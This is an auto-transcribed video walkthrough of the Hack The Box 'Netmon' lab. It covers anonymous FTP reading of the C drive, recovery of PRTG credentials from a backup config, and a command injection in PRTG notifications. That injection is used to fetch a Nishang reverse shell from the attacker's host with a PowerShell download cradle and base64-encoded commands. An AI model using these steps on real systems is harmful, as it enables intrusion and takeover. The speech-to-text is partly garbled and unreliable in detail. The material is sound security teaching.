 what's going on YouTube is a hip sack and we do a net mom from ACTA box which was an easy Windows machine then involved identifying the application PRTG Network model on port 80 and also the open FTP share by doing a few googles you can find out where PRTG stores its configuration and then retrieve that configuration via FTP but if you go for the most recent one it is encrypted if you go for the backup which was taken about a year ago you will see their credentials that end in 2018 because it is a backup config that's about a year old just increment the password by one and get 2019 and log right into PRTG from there like many other system and slash monitoring applications there are ways to execute code once you get administrative access on the web page so we inject a code execution into I think a notification and then just get an administrative shell so with that being said let's just jump in as always let's begin with it and map so - SC for default scripts as V enumerate version 0 a output all formats put in the F and map directory and call it net mod and then the IP address which is 10 10 10 152 can take some time to run so I've already ran it looking at the results we have a handful of ports open the first thing is FTP on port 21 and it's running the default Microsoft FTP D server we have the N map script telling us anonymous FTP login is allowed and looking at the output it looks like we have the root of C exposed as we see Windows users and Program Files so based upon this we have read access to the C Drive which can give us tons of information and even like patching information of windows along with the Windows version and configs of just services on the box so having this access is a pretty big we'll go back to it probably really soon the next thing we have is HTTP on port 80 and it's the indi httpd webserver which I don't know what server this is I'd expect to see like iis or apache here but thankfully and that tells us it's the pay's web PRTG bandwidth monitor so probably the people that made it compiled a custom web server the version information matches the HTTP header and we also see it is the PRTG Network Monitor and the hostname of the box is net Mon so just basic information about the webpage then we have the standard SMB ports Microsoft Marie proceed roll call on 135 NetBIOS on 139 and Microsoft - GS which is SMB on port 445 so let's go over what each of these ports means four four five means well we may be able to read files but why would we want to read files when we already can read the root of C with FTP but it also means if we ever get an administrative username then we can just PS exec and get admin or get a remote shell web servers are vulnerable it can lead to anything but web servers always have config files and with FTP we can read the config files of web servers so that's probably going to be one of the first steps but before I even do that I want to get some information about the OS I'm on so let's go into the windows directory with FTP running FTP 10 10 10 152 will get us access the username will be anonymous the password be anonymous and and map scripts had told us anonymous logon was allowed so that's why we did that do a dir command and we can see that we're in the root of C we can do dir - a to show hidden files we could go into like recycle bin if we wanted to and see if anything's there and looks like recycle bin is empty but the main thing I want to look at is this windows folder because it contains a bunch of information that we want so I'm gonna Google like windows lfi files and see if we can find a blog post real quick and I'm searching windows lfi which is local file inclusion because normally when you have local file inclusion you go after juicy files we don't have local file inclusion but we can still read the same juicy files so I'm gonna check out this blog post on graceful security because I believe this one has some stuff yes it does so the first thing we want to look at is like Windows PHP dot ini' to tell us that PHP may be installed so go into windows get pH VI and I cannot find the file so it's not there we can try to go into the repair directory if we can get in there maybe we can grab the Sam which is a registry hive along with system software and security we can go and get the host file this box which will potentially contain DNS information maybe the host name so if we do get system 32 drives Etsy host maybe with the CD every time drivers let's see get hearse and then let's go back up and I should have moved myself to the FTP directory or something before doing this because all my files are just gonna be in the root of what I'm at which is annoying but we can move them later wind on ini I don't know what this is but may have good information going down we have stuff in Panther this is the directory where if you do a automated install log files will get put here and old versions of Windows it would actually put passwords of the default account doesn't do that anymore it reacts them but doesn't look like we have those files we look at D unattended G C as well we don't see the what flowers at want unattended or something so they're good there it is so we also have debug net setup which I think also may get created at install time we'll give you some information about who installed it so let's go into debug to see what's there we don't have anything so I think that's all the interesting files here we could see if we can go into config if we can go into config we may be an administrator whoops CD system 32 CD config can't go in there so probably not administrator we could also just go into users administrator see if we can we get access to nine so definitely not an admin of this box there's only two users so let's go look at public desktop can't get a desktop but we can get a user text file so we'll download that and looks like I may have downloaded so let's go back into Windows and there's a few files I normally grab that's not on this lfi thing so I like grabbing Windows Update I can type Windows Update dot log because this will tell us the patch level of machines when the last update was applied if we haven't seen updates since like 2016 we may try something like eternal blue so the next thing we want is in system 32 and it's licensed RTF which is the license file for Windows is to tell us if it's Windows 2008 2012 2016 2019 so it tells us that and I think that's what we want so let's go take a look at these files let's move them into FTP to stay organized so host licensed user windows win and to FTP and then looking at these let's look at the host file we don't have anything there didn't give us any extra host names let's look at licensed RTF and this is a rich text format so it's a bit hard to read unless we can open that in like libery office to be a bit cleaner but we see this is Windows 2016 we can look at Windows Update dot log and it's telling us the log file is no longer here it's generated using event tracing for Windows which is a shame we can look at window and I doesn't give us anything and then we can do a WCC on user dot text and b5 some study two characters you got a line break so chances are that is the user flag on this box so since we couldn't get the information out of Windows Update log I'm gonna go into I think it's software distribution yep and then download and do a dir and this is where like Windows updates get placed and looking at this I don't see any files so chances are this box has never been updated since install so that's it for oh that's not it for FTP let's do anonymous anonymous and we have to go to a web browser and look at ten ten ten one fifty two we get this PRTG login we can try logging it with admin admin we can Google like PRTG Network Monitor default credential see if we get anything here PRTG admin PRTG admin is the defaults so we can always try those and we can't well again so let's Google for PRTG Network configuration file and when mr. Ben had created this box he actually had it as defaults and I had changed this just to be a little bit I guess more difficult because it was default credentials and FTP wasn't there I'm the one that had installed FTP when I was testing the machine and did this little next step so if we look in program data Paisley appeared GG Network Monitor that's where this data directory is and we know that because that's where it's telling us it says in Windows 2016 it's here and Windows XP or 2003 it's in user profile application data so let's go into program data and then we go to phase ler and then PRTG Network Monitor CD PRTG Network Monitor CD PRTG Network Monitor and quotes there we go and let's see we got logs we got configuration and a bunch of other things so let's grab the configuration file so let's get PRTG configuration at and I didn't need a closeout to a quote that's odd I only did one quote here and it still downloaded it and then I'm looking at this dot old it's the same file size so chances are it's the same file but we'll grab it an md5 summon anyways so let's grab that and then we have this PRTG configuration dot old dot back and the date of this file is July 14th 2018 and I also created this file and I put my birthday July 14th in place of the date created so little Easter Egg there but let's get this file as well and then let's look at them so let's do md5sum on PRTG stir and we see Dadon order the same file so we can delete dot old so let's do RM that and let's look at PRTG configuration dot dot and oh god this is big so I'm just going to do a grep I user on the file name we can do sort - you know let's do said and replace every space with nothing and now sort - you which will get us a little less information to go through so looking at this we don't really see anything we see the proxy user that's not what we wanted let's do it on the let's grep for password see if we have anything here so we don't but we have everything in XML format so we may be missing a line so if we do grep - I we can do - be for before 5 - a for after 5 and looking at this and we get some data so DB credential is still blank name let's do this against the old file and see what we have nothing really sticks out so we may it be stuck actually looking through this file which will be annoying but it's - dot or is it configuration old dot back see what we have here password it's a base64 and we have something here PRTG admin 2018 user PRTG admin so let's take a look at this config and see where this Klein came out and we also have password in some base64 but let's look at PRTG configuration old dot back and I think was PRTG a here we go we have the database password PRTG admin and then putting the credentials here so the first thing I'm going to do is try logging in with the credentials in this backup file so let's go to PRTG admin paste this whoops and when you get login failed so let's try logging into SMB with these so let's do SMB map - you PRTG admin - p put in the password - d for domain or do net Mon - capital H 10 10 10 125 and fifty-two there we go we also get a login failure here so if you remember this um - oh it's closed we can probably do a search for 14 there we go we see these configs were done on February 25th and this config which has 2018 in it was done in 2018 so what are what the chances are that they just incremented the year every time they change it so let's try that let's do PRTG admin and comment the Year by one let's see when we copy and paste everything so I don't make a tight Bell there we go and then copy this put 2019 paste well again and we get logged into this application so I'm going to go and do a search point on it to see if there's anything interesting so search point PRTG and we have a denial of service and I think I think it's actually vulnerable I'm not positive but that looks like the version we have so nmap or is it net Mon and map we're running version one three nine four six and this is definitely newer than that so probably vulnerable to this but it's a denial of service so probably don't want to do that so let's just poke around the application we do Maps reports we can look at a report I made its X special report take a look at this run report we can view it as HTML and it doesn't actually do anything the only reason I created this report is because I put something in this application to revert it so I wanted to make sure the report had got removed so and then i snapshotted it after i created this and there you have it it was just a fragment left and testing that i left as an easter egg but doesn't look like that's doing anything we can also just look at CVEs for this application maybe no one created an exploit for this look yet so let's just do C OTG PRTG Network Monitor which i think is the applications name and we have the CVE details for this application and we also have one down here that we should read 2018 so looking at this it's a little bit odd because they don't have any CVEs in 2018 but google is showing one is in 2018 and it's definitely the application as we can see but saying in PRTG Network Monitor I'm just gonna click pays lured to see there's anything here nope missing 2018 and 2019 doesn't have a code execution I normally don't care about cross-site scripting but let's go to this an issue was discovered in PRTG Network Monitor before 18 to 39 an attacker who accesses the system administrator web console with admin privileges can exploit an OS command injection vulnerability both on the server device by sending malformed parameters and sensor or notification management scenarios so let's go back here and let's see it said it sent email and sensor things a sensor scenarios so let's try to go here let's see click this little edit thing and check click settings that little wrench and see what we can do for ping and don't see anything here so looking back it said in notification scenarios so we have to figure out where in this application we can go to send at notification emails so the first place I'm going to check is this setup and we'll try notification delivery I hate that right-click doesn't work in this application but looking at this I don't really see anything let's go back into setup let's click on notifications and we have various ones so what if I can make this bigger there we go so I'm going to click here and making this bigger made it so I can't click this wrench to go into settings and you can look at this we got the notification name scheduled postponed some realisation subjects access rights send email push notification yada yada yada and then eventually we have execute program so if we click this we can have either execute alphabet or alpha PS one so I'm gonna do alpha bat first and let's test this with test pipe ping /n one to do one ping 10 10 14 3 which is my IP address I'm gonna run TCP dump a ton 0 ICMP and we can click OK and then under this ticket notification I'm gonna click resume and see what happens we don't get a ping let's see is a clone pause send test notification try clicking that notification was triggered and queue to the recipe recipients and we don't have anything so maybe I screwed up how to do paying or this just didn't work so let's see I clicked in the bottom one right so I'll follow about that let's do ping - on and step / and then also make sure my IP address is what I think it is 10 10 14 3 that is correct so it's send this test notification nothing happened so let's try doing this through PowerShell let's do edit we can execute program let's try out for ps1 and try this send test and we get a ping so for some reason in the bat version and didn't work but in the powershell one it does so we have validated we have command execution so let's make two dub dub and we're going to grab a reverse shell so CP opt nishang shells then invoke tcp or invoke powershell tcp ps1 and let's move that to something that's easier to type so reverse ps1 and then we just to put our IP address so let's grab this line go to the bottom paste it and then we'll do ten ten ten or ten ten fourteen three and port 9001 so now we have to set up a HTTP server so CD dub dub dub python - em simple HTTP server again if i can type and then netcat LVN p 9001 so we can go back into this little notification tab click the wrench and we'll try to do PowerShell again so we'll do test pipe and we can just do IX new object net dot web client download string HTTP 10 10 14 3 port 8000 and we have to specify reverse ps1 so I'm just gonna copy this just in case something bad happens and then let's send this test notification we can see it made a get request against a web server and we don't have a shell which is odd so let's go into dub dub dub blast reverse dot ps1 and ten ten fourteen three point nine thousand one so that should work but it didn't so let's just try something else let's do another execute and let's see let's try putting this in quotes go so we got it twice when you put the double quotes it doesn't look like it got it at all so we can try a quote to escape it let's go back to config and let's do back slashes which I don't think are necessary but and try this nothing worked so I'm guessing something's weird with how it's processing a quote just because the fact it's not working we could try adding PowerShell here but I really doubt it's going to do anything so do this let go and it can also be it can't talk to us on port 9000 one so we could also just change this to be 80 and then edit a reversed ps1 we are you on dub dub dub to be for a t-test that again and still nothing so what we're going to do is I'm going to eliminate bad characters by let some basics t4 in code this input and try doing it that way so cat reversed ps1 I come to convert it to utf-16 little-endian which is just how Windows has files formatted base 64 - with 0 to copy everything and we can probably paste that with is it X clip - clipboard primarily I think X clip - H so it's - selection primary ok so that should be in my clipboard so we lost connection let's do can we still edit this looks like we can't so maybe the box rebooted so let's login with PRTG admin and we have to get the password again so let's go to FTP grep PRTG out of that's not an FTP we did not move it there so PRTG out of the configuration file let's do maybe it's the 2018 grep 2018 out of the file and we get the password tastehh backspace 19 okay let's go to set up notifications we can edit this go to settings and go all the way down what was execute a program and we want to do outfall ps1 and the parameter will do please subscribe pipe it to powershell - NC for encoded and we have to grab that output again see is it selection clipboard there we go click OK let's test a notification and we have a shell so if we do do we mi we're anti-authority system because that's what this application runs as so we can just go into users administrator and then desktop and we could grab root text so that was the box I hope you guys enjoyed it and if you're confused exactly what happened remember the reverse type ps1 file I just encrypted that or not encrypted and garroted that in base64 and then had PowerShell execute that base64 so it just didn't like something some character I had in the previous string probably a quote I don't know what it was but take care and I will see you all next week